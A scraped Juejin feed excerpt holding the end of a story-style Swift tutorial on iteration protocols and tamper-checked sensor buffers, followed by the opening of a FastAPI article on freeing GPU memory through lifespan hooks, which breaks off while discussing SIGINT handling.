    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span>
}

<span class="hljs-comment">// 传感器数据实现校验协议</span>
<span class="hljs-keyword">extension</span> <span class="hljs-title class_">SensorData</span>: <span class="hljs-title class_">DataVerifiable</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">verifyChecksum</span>() -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 计算“内容+时间戳”的MD5哈希值（真实项目中建议用更安全的SHA256）</span>
        <span class="hljs-keyword">let</span> calculatedChecksum <span class="hljs-operator">=</span> <span class="hljs-string">"<span class="hljs-subst">\(content)</span>-<span class="hljs-subst">\(timestamp)</span>"</span>.md5()
        <span class="hljs-keyword">return</span> calculatedChecksum <span class="hljs-operator">==</span> <span class="hljs-keyword">self</span>.checksum
    }
}

<span class="hljs-comment">// 自定义错误：数据篡改错误</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">DataTamperingError</span>: <span class="hljs-title class_">Error</span> {
    <span class="hljs-keyword">case</span> invalidChecksum(<span class="hljs-type">String</span>)
}
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe4917dea20e4c8fa13e96c614e01bf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=hKXMib4yBDm175yMkDcpXI8OR%2Bg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-7">效果：“迭代异常兽” 的篡改彻底失效</h3>
<p>当 “迭代异常兽” 试图把篡改后的传感器数据（校验码不匹配）入队时，<code>enqueue</code>会直接抛出<code>DataTamperingError</code>，错误数据连缓冲区的门都进不了；就算它想偷偷修改缓冲区里的数据，<code>subscript</code>访问时的二次校验也会触发<code>preconditionFailure</code>，立刻暴露问题。</p>
<p>艾拉测试时故意注入一条篡改数据，系统瞬间弹出警告：“DataTamperingError：数据校验失败，ID：sensor_123，可能被篡改”—— 就像赛车的防盗系统检测到非法入侵，立刻锁死引擎，让 “小偷” 无从下手。</p>
<h2 data-id="heading-8">🏆 终局：组合拳粉碎 “迭代异常兽”</h2>
<p>解决了错误恢复和数据篡改，艾拉和杰西打出最后一套 “组合拳”：用<code>RetryableSensorSequence</code>处理异步错误，用<code>SafeRingBuffer</code>做数据缓存和校验，再配合一个 “监控 Task” 实时监控序列状态 —— 三者联动，形成无死角的防御网。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f42b5ca1a5147fa8687af3fd9bb4c89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=gLcjcdWAZaJ%2Bu9oftzKuUJd7c1w%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-9">完整流程代码（终局方案）</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. 创建带校验的环形缓冲区（容量10，只存合法数据）</span>
<span class="hljs-keyword">var</span> verifiedBuffer <span class="hljs-operator">=</span> <span class="hljs-type">SafeRingBuffer</span>&lt;<span class="hljs-type">SensorData</span>&gt;(capacity: <span class="hljs-number">10</span>)

<span class="hljs-comment">// 2. 创建可重试的传感器序列（防断连、防重复）</span>
<span class="hljs-keyword">let</span> sensorSequence <span class="hljs-operator">=</span> <span class="hljs-type">SensorSequence</span>()
<span class="hljs-keyword">let</span> retryableSequence <span class="hljs-operator">=</span> <span class="hljs-type">RetryableSensorSequence</span>(baseSequence: sensorSequence)

<span class="hljs-comment">// 3. 主Task：消费序列，存入缓冲区</span>
<span class="hljs-keyword">let</span> mainTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">do</span> {
        <span class="hljs-keyword">for</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> data <span class="hljs-keyword">in</span> retryableSequence {
            <span class="hljs-keyword">do</span> {
                <span class="hljs-keyword">try</span> verifiedBuffer.enqueue(data)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"成功入队：ID=<span class="hljs-subst">\(data.id)</span>，转速=<span class="hljs-subst">\(data.engineRPM)</span>转"</span>)
                <span class="hljs-comment">// 实时更新仪表盘（只传合法数据）</span>
                <span class="hljs-keyword">await</span> dashboard.update(with: verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>])
            } <span class="hljs-keyword">catch</span> <span class="hljs-type">DataTamperingError</span>.invalidChecksum(<span class="hljs-keyword">let</span> message) {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"拦截篡改数据：<span class="hljs-subst">\(message)</span>"</span>)
                <span class="hljs-comment">// 触发警报，记录日志</span>
                <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.high, message: message)
            }
        }
    } <span class="hljs-keyword">catch</span> {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"迭代终止：<span class="hljs-subst">\(error)</span>"</span>)
        <span class="hljs-comment">// 重试失败，切换到备用传感器</span>
        <span class="hljs-keyword">await</span> switchToBackupSensor()
    }
}

<span class="hljs-comment">// 4. 监控Task：实时检查缓冲区状态，防止异常</span>
<span class="hljs-keyword">let</span> monitorTask <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
    <span class="hljs-keyword">while</span> <span class="hljs-operator">!</span><span class="hljs-type">Task</span>.isCancelled {
        <span class="hljs-keyword">guard</span> verifiedBuffer.count <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"警告：缓冲区为空，可能传感器无数据"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.low, message: <span class="hljs-string">"缓冲区空"</span>)
            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
            <span class="hljs-keyword">continue</span>
        }
        <span class="hljs-comment">// 每1秒检查一次最新数据的时效性（防止数据过期）</span>
        <span class="hljs-keyword">let</span> latestData <span class="hljs-operator">=</span> verifiedBuffer[verifiedBuffer.count <span class="hljs-operator">-</span> <span class="hljs-number">1</span>]
        <span class="hljs-keyword">if</span> <span class="hljs-type">Date</span>().timeIntervalSince(latestData.timestamp) <span class="hljs-operator">&gt;</span> <span class="hljs-number">5</span> {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"警告：最新数据已过期，可能序列卡顿"</span>)
            <span class="hljs-keyword">await</span> alertSystem.triggerLevel(.medium, message: <span class="hljs-string">"数据过期"</span>)
        }
        <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
    }
}
</code></pre>
<h3 data-id="heading-10">剧情收尾：赛道恢复平静，迭代真相揭晓</h3>
<p>当这套组合拳部署完成后，赛车仪表盘的转速数据瞬间稳定下来 ——10000 转、10020 转、9980 转，每一个数字都精准跳动，控制室的警报声渐渐平息。艾拉看着屏幕上 “所有传感器正常” 的绿色提示，长舒一口气：“‘迭代异常兽’被打跑了？”</p>
<p>杰西笑着点开日志，里面全是 “拦截篡改数据”“重试成功” 的记录：“不是打跑，是它再也没法钻漏洞了。你看 ——AsyncSequence 的核心是‘错误可控’，Collection 的核心是‘数据可信’，迭代器的核心是‘状态独立’，只要守住这三个核心，再狡猾的问题也能解决。”</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f87bd5000834169ad41c9bbd7cc0ae0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=l42wJ%2B39GjJSTLwxqVty%2FtuoEqk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>突然，仪表盘弹出一条新消息：“检测到外部干扰源已断开连接”——“迭代异常兽” 彻底消失了。</p>
<p>赛道上，F1 赛车重新加速，引擎的轰鸣声再次变得均匀有力；屏幕前，艾拉和杰西相视一笑，他们不仅修复了系统，更摸清了 Swift 迭代的 “底层逻辑”。</p>
<h2 data-id="heading-11">📝 终极总结：Swift 迭代的 “黄金法则”</h2>
<ol>
<li><strong>Sequence 是 “入门契约”</strong>：只承诺 “能迭代一次”，适合懒加载、生成器场景，像 F1 的 “练习赛”—— 灵活但不追求稳定。</li>
<li><strong>Collection 是 “进阶契约”</strong>：多轮迭代、索引访问、数据稳定，适合需要反复操作的数据，像 F1 的 “正赛”—— 稳定且高效。</li>
<li><strong>AsyncSequence 是 “异步契约”</strong>：支持暂停、抛错，适合数据流场景，但要注意 “错误终止性” 和 “重试防重复”，像 F1 的 “夜间赛”—— 更复杂，但有专属的应对策略。</li>
<li><strong>迭代器的 “值语义优先”</strong>：尽量用 struct 实现迭代器，避免共享可变状态，就像赛车的 “独立操控系统”—— 互不干扰，安全可控。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc043a15ff8d4f1ba564566f02ea4d89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=BmhYXOVWjyb2nknjqfaZUY6AMOk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>最后记住：Swift 的迭代看似简单，实则是 “协议驱动” 的精妙设计。当你写下<code>for item in list</code>时，背后是 Sequence、Collection、Iterator 的协同作战 —— 就像 F1 赛车的引擎、刹车、底盘完美配合，才能跑出最快的速度，也才能写出最稳定、最高效的代码。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/253bf7fec4ec44e8b1e3c8452905d398~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765937544&amp;x-signature=8kSe9U2VE3lF6L6xAMXbkZLhv2o%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>那么，宝子们看到这里学到了吗？</p>
<p>感谢观赏，下次我们再会吧！8-)</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 模型占了 10G 显存，服务重启却没释放？]]></title>    <link>https://juejin.cn/post/7581765536372064265</link>    <guid>https://juejin.cn/post/7581765536372064265</guid>    <pubDate>2025-12-10T01:56:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372064265" data-draft-id="7581765536371965961" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 模型占了 10G 显存，服务重启却没释放？"/> <meta itemprop="keywords" content="AI编程,后端"/> <meta itemprop="datePublished" content="2025-12-10T01:56:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lomocode"/> <meta itemprop="url" content="https://juejin.cn/user/2103792315926697"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 模型占了 10G 显存，服务重启却没释放？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2103792315926697/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lomocode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:56:23.000Z" title="Wed Dec 10 2025 01:56:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5def41376f0e436db16d2e868d7ff77e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbG9tb2NvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765936582&amp;x-signature=EYRWW%2FL7NILBEcVYZZ%2Baoc%2BcMuU%3D" alt="ScreenShot_2025-12-10_095136_976.jpg" loading="lazy"/></p>
<blockquote>
<p>聊聊 AI 后端那些事儿 · 第 1 篇 | 预估阅读：10 分钟</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">发现显存泄漏 - 「我有个朋友」系列</h2>
<p>我有个朋友叫小禾，前些天，小禾踩了不少前端的坑。这几天，小禾开始对付后端。</p>
<p>后端用的是 FastAPI，跑在一台有 24G 显存的 GPU 服务器上。本地开发一切正常，部署上去也没问题。</p>
<p>直到有一天，小禾在服务器上按了 Ctrl+C 停掉服务，准备更新代码。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 停止服务</span>
^C
INFO: Shutting down...

<span class="hljs-comment"># 重新启动</span>
$ python run.py
</code></pre>
<p>然后，服务就崩了：</p>
<pre><code class="hljs language-sql" lang="sql">torch.cuda.OutOfMemoryError: CUDA <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> memory.
Tried <span class="hljs-keyword">to</span> <span class="hljs-keyword">allocate</span> <span class="hljs-number">2.00</span> GiB (GPU <span class="hljs-number">0</span>; <span class="hljs-number">24.00</span> GiB total capacity;
<span class="hljs-number">22.10</span> GiB already allocated; <span class="hljs-number">1.43</span> GiB <span class="hljs-keyword">free</span>)
</code></pre>
<p>小禾懵了：我明明停掉服务了，为什么显存还被占着？</p>
<p>他打开 nvidia-smi 一看：</p>
<pre><code class="hljs language-bash" lang="bash">$ nvidia-smi
+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|=============================================================================|
|    0   N/A  N/A     12345      C   python                          10240MiB |
+-----------------------------------------------------------------------------+
</code></pre>
<p>进程还在！</p>
<p>原来 Ctrl+C 虽然停了 uvicorn，但 Python 进程没有完全退出，模型还在显存里躺着。</p>
<p>小禾只好 <code>kill -9</code> 强制杀掉进程，然后重新启动。</p>
<p>"这也太蠢了吧，每次重启都要手动杀进程？"</p>
<hr/>
<h2 data-id="heading-1">FastAPI 的生命周期</h2>
<p>小禾查了查文档，发现 FastAPI 有一套生命周期管理机制。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[应用启动]
    B[startup 事件]
    C[加载 AI 模型&lt;br/&gt;初始化数据库连接&lt;br/&gt;预热缓存]
    D[处理请求...]
    E[shutdown 事件]
    F[释放 AI 模型&lt;br/&gt;关闭数据库连接&lt;br/&gt;清理临时文件]
    G[应用关闭]

    A --&gt; B
    B --&gt; C
    C --&gt; D
    D --&gt; E
    E --&gt; F
    F --&gt; G
</code></pre>
<p>原来 FastAPI 提供了 <code>startup</code> 和 <code>shutdown</code> 两个事件钩子，可以在应用启动和关闭时执行特定逻辑。</p>
<p>小禾之前只写了加载模型的代码，但从来没写过释放模型的代码。</p>
<p>难怪显存不释放——根本没人告诉程序要释放。</p>
<hr/>
<h2 data-id="heading-2">两种写法</h2>
<p>FastAPI 支持两种生命周期管理方式。</p>
<p><strong>写法一：装饰器方式（传统写法）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

app = FastAPI()

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"startup"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">startup_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用启动"</span>)
    <span class="hljs-comment"># 加载模型</span>

<span class="hljs-meta">@app.on_event(<span class="hljs-params"><span class="hljs-string">"shutdown"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">shutdown_event</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用关闭"</span>)
    <span class="hljs-comment"># 释放模型</span>
</code></pre>
<p><strong>写法二：lifespan 上下文管理器（推荐，FastAPI 0.93+）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-comment"># 启动时执行</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用启动"</span>)
    <span class="hljs-keyword">yield</span>
    <span class="hljs-comment"># 关闭时执行</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"应用关闭"</span>)

app = FastAPI(lifespan=lifespan)
</code></pre>
<p>小禾选了第二种写法，因为它更清晰——启动和关闭的逻辑写在一起，一眼就能看出配对关系。</p>
<hr/>
<h2 data-id="heading-3">完整的生命周期管理</h2>
<p>小禾开始重构代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/main.py</span>
<span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> asynccontextmanager
<span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
<span class="hljs-keyword">from</span> app.services.model_manager <span class="hljs-keyword">import</span> ModelManager
<span class="hljs-keyword">from</span> app.core.config <span class="hljs-keyword">import</span> settings
<span class="hljs-keyword">from</span> app.core.logger <span class="hljs-keyword">import</span> logger

<span class="hljs-comment"># 全局模型管理器</span>
model_manager = ModelManager()

<span class="hljs-meta">@asynccontextmanager</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">lifespan</span>(<span class="hljs-params">app: FastAPI</span>):
    <span class="hljs-string">"""应用生命周期管理"""</span>

    <span class="hljs-comment"># ===== 启动阶段 =====</span>
    logger.info(<span class="hljs-string">f"正在启动 <span class="hljs-subst">{settings.PROJECT_NAME}</span>"</span>)
    logger.info(<span class="hljs-string">f"运行环境: <span class="hljs-subst">{settings.ENVIRONMENT}</span>"</span>)
    logger.info(<span class="hljs-string">f"设备: <span class="hljs-subst">{settings.DEVICE}</span>"</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 加载 AI 模型</span>
        model_manager.load_model()
        logger.info(<span class="hljs-string">f"模型 (<span class="hljs-subst">{settings.IMAGE_MODEL}</span>) 加载完成"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"启动失败: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
        <span class="hljs-keyword">raise</span>  <span class="hljs-comment"># 启动失败要抛出异常，阻止服务启动</span>

    <span class="hljs-comment"># ===== 运行阶段 =====</span>
    <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># 服务运行中...</span>

    <span class="hljs-comment"># ===== 关闭阶段 =====</span>
    logger.info(<span class="hljs-string">"正在关闭服务..."</span>)

    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 释放模型资源</span>
        model_manager.cleanup()
        logger.info(<span class="hljs-string">"模型资源已释放"</span>)

    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"清理时出错: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)

    logger.info(<span class="hljs-string">"服务已关闭"</span>)

app = FastAPI(
    title=settings.PROJECT_NAME,
    lifespan=lifespan
)
</code></pre>
<p>关键在于 <code>cleanup()</code> 方法，它负责释放 GPU 显存。</p>
<hr/>
<h2 data-id="heading-4">模型清理的正确姿势</h2>
<p>小禾最初写的清理方法是这样的：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
    <span class="hljs-keyword">del</span> self.model
    self.model = <span class="hljs-literal">None</span>
</code></pre>
<p>结果发现：显存还是没释放。</p>
<p>原来 PyTorch 的显存管理比较特殊，单纯 <code>del</code> 是不够的。小禾查了资料，找到了正确的清理流程：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># app/services/model_manager.py</span>
<span class="hljs-keyword">import</span> gc
<span class="hljs-keyword">import</span> torch

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelManager</span>:
    <span class="hljs-string">"""模型管理器"""</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.pipe = <span class="hljs-literal">None</span>
        self.device = settings.DEVICE

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_model</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""加载模型到 GPU"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>  <span class="hljs-comment"># 已加载，不重复加载</span>

        logger.info(<span class="hljs-string">"正在加载模型..."</span>)
        self.pipe = StableDiffusionXLPipeline.from_pretrained(
            settings.MODEL_PATH,
            torch_dtype=torch.float16,
        ).to(self.device)
        logger.info(<span class="hljs-string">"模型加载完成"</span>)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""释放模型资源"""</span>
        <span class="hljs-keyword">if</span> self.pipe <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span>

        logger.info(<span class="hljs-string">"正在释放模型资源..."</span>)

        <span class="hljs-comment"># 第一步：把模型从 GPU 移到 CPU</span>
        self.pipe.to(<span class="hljs-string">"cpu"</span>)

        <span class="hljs-comment"># 第二步：删除引用</span>
        <span class="hljs-keyword">del</span> self.pipe
        self.pipe = <span class="hljs-literal">None</span>

        <span class="hljs-comment"># 第三步：强制垃圾回收</span>
        gc.collect()

        <span class="hljs-comment"># 第四步：清理 CUDA 缓存</span>
        <span class="hljs-keyword">if</span> torch.cuda.is_available():
            torch.cuda.empty_cache()
            torch.cuda.synchronize()  <span class="hljs-comment"># 等待 GPU 操作完成</span>

        logger.info(<span class="hljs-string">"模型资源已释放"</span>)
</code></pre>
<p>四步缺一不可：</p>
<ol>
<li><strong>移到 CPU</strong>：先把张量从 GPU 搬走</li>
<li><strong>删除引用</strong>：解除 Python 对象的引用</li>
<li><strong>垃圾回收</strong>：触发 Python 的 GC</li>
<li><strong>清理缓存</strong>：告诉 CUDA 释放已分配但未使用的显存</li>
</ol>
<p>小禾测试了一下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动前</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB

<span class="hljs-comment"># 服务运行中</span>
$ nvidia-smi
GPU Memory: 12GB / 24GB

<span class="hljs-comment"># Ctrl+C 停止服务</span>
$ nvidia-smi
GPU Memory: 2GB / 24GB  <span class="hljs-comment"># 释放了！</span>
</code></pre>
<p>终于正常了。</p>
<hr/>
<h2 data-id="heading-5">但是，Ctrl+C 有时候不管用</h2>
<p>小禾高兴了没两天，问题又来了。</p>
<p>有时候用 Ctrl+C 停止服务，<code>shutdown</code> 事件根本没触发，显存还是被占着。</p>
<p>他研究了一下，发现问题出在信号处理上。</p>
<p>当你按 Ctrl+C 时，系统发送的是 <code>SIGINT</code> 信号。正常情况下，uvicorn 会捕获这个信号，优雅地关闭服务。</p>
